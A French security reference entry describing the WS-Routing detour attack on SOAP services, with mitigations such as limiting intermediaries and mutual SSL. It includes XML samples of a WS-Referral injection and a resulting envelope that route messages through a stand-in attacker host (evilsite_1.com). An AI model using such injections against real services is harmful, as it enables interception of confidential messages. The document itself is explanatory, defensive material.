Vulnérabilité de détournement de routage SOAP

La description


Le WS-Routing Protocol est un protocole d'échange de messages SOAP d'un expéditeur de message initial vers un récepteur, généralement via un ensemble d'intermédiaires. Le protocole WS-Routing est implémenté en tant qu'extension SOAP et est intégré dans l'en-tête SOAP. WS-Routing est souvent utilisé pour fournir un moyen de diriger le trafic XML à travers des environnements et des transactions complexes en permettant aux stations intermédiaires du chemin XML d'attribuer des instructions de routage à un document XML.

En adoptant une approche minimaliste, WS-Routing encapsule un chemin de message dans un message SOAP, afin que le message contienne suffisamment d'informations pour être envoyé sur Internet à l'aide de transports comme TCP et UDP tout en prenant en charge:

  • Le modèle de chemin de message SOAP,
  • Modèles de messages unidirectionnels en duplex intégral,
  • Modèles de message en duplex intégral, demande-réponse, et
  • Corrélation des messages.

Les détours de routage sont un type d'attaque de type "l'homme au milieu" où des intermédiaires peuvent être injectés ou "détournés" pour acheminer des messages sensibles vers un emplacement extérieur. Les informations de routage (dans l'en-tête HTTP ou dans l'en-tête WS-Routing) peuvent être modifiées en cours de route et les traces du routage peuvent être supprimées de l'en-tête et du message de sorte que l'application réceptrice ne soit pas plus sage qu'un détour de routage se soit produit.

Problème principal


L'attaquant injecte un nœud de routage bidon (à l'aide d'un service WS-Referral) dans la table de routage de l'en-tête XML du message SOAP identifié lors de la phase d'exploration. Ainsi, l'attaquant peut router le message XML vers le nœud contrôlé par l'attaquant (et accéder au contenu du message)

Exemple d'injection WS-Routing basée sur WS-Referral de la route du nœud faux 


<r:ref xmlns:r="http://schemas.example.com/referral"> <r:for> <r:prefix>http://example_2.com/router</r:prefix> </r:for> <r:if/> <r:go> <r:via>http://evilsite_1.com/router</r:via> </r:go> </r:ref>

Attaque de détournement de routage résultante 


 <S:Envelope> <S:Header> <m:path xmlns:m="http://schemas.example.com/rp/" S:actor="http://schemas.example.com/soap/actor" S:mustUnderstand="1"> <m:action>http://example_0.com/</m:action> <m:to>http://example_4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd> <m:via>http://example_2.com/router</m:via> <m:via>http://evilesite_1.com/router</m:via> <m:via>http://example_3.com/router</m:via> </m:fwd> <m:rev /> </m:path> </S:Header> <S:Body> ... </S:Body> </S:Envelope>

Conséquence


Ainsi, en utilisant Routing Detour, l'attaquant peut router le message XML vers un nœud contrôlé par un pirate (et accéder au contenu du message).

Assainissement général


Conception: spécifiez le nombre maximal de nœuds intermédiaires pour la demande et exigez des connexions SSL avec authentification mutuelle.

Implémentation: utilisez SSL pour les connexions entre toutes les parties avec authentification mutuelle
